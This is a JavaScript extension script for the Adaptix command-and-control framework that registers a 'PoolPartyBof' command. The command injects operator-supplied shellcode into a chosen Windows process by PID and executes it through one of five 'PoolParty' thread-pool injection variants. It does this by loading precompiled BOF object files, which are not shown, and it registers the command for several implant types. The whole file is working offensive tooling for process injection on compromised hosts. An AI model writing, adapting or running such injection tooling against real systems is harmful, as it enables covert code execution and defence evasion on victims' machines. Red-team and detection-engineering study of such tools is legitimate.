// PoolPartyBof for Adaptix
// Original CNA: PoolPartyBof <pid> <Shellcode File> <variant>
// Place .o files next to this script:
//   PoolPartyBof_V4.x64.o  PoolPartyBof_V5.x64.o
//   PoolPartyBof_V6.x64.o  PoolPartyBof_V7.x64.o
//   PoolPartyBof_V8.x64.o

let cmd_poolpartybof = ax.create_command(
    "PoolPartyBof",
    "Opens a process (given PID), and injects the shellcode, executes via 5 different Variants.",
    "PoolPartyBof <pid> <shellcode_file> <variant>\n  variant: 4, 5, 6, 7 (default 8)"
);
cmd_poolpartybof.addArgInt("pid", true, "Target process ID");
cmd_poolpartybof.addArgFile("shellcode_file", true, "Path to raw shellcode file on the operator disk");
cmd_poolpartybof.addArgInt("variant", true, "PoolParty variant: 4, 5, 6, 7, or 8");
cmd_poolpartybof.setPreHook(function(id, cmdline, parsed_json, parsed_lines) {
    if (ax.arch(id) !== "x64") {
        ax.log_error("Only x64 Supported");
        return;
    }

    let pid = parsed_json["pid"];
    if (pid <= 0) {
        ax.log_error("Please enter a valid PID");
        return;
    }

    let variant = parsed_json["variant"];
    let bof_name;
    if (variant === 7) {
        bof_name = "PoolPartyBof_V7";
    } else if (variant === 5) {
        bof_name = "PoolPartyBof_V5";
    } else if (variant === 4) {
        bof_name = "PoolPartyBof_V4";
    } else if (variant === 6) {
        bof_name = "PoolPartyBof_V6";
    } else {
        bof_name = "PoolPartyBof_V8";
        variant = 8;
    }

    // addArgFile already reads the operator file and puts base64 in parsed_json
    let sc_data = parsed_json["shellcode_file"];
    if (!sc_data || sc_data.length === 0) {
        ax.log_error("File doesn't exist or is empty");
        return;
    }

    let bof_path = ax.script_dir() + bof_name + "." + ax.arch(id) + ".o";
    let args = ax.bof_pack("int,bytes", [pid, sc_data]);
    ax.execute_alias(
        id,
        cmdline,
        `execute bof "${bof_path}" ${args}`,
        "Opening " + pid + " and running PoolParty (" + variant + " Variant)"
    );
});

let group = ax.create_commands_group("PoolPartyBof", [cmd_poolpartybof]);
ax.register_commands_group(group, ["beacon", "gopher", "kharon", "CrystalForge"], ["windows"], []);
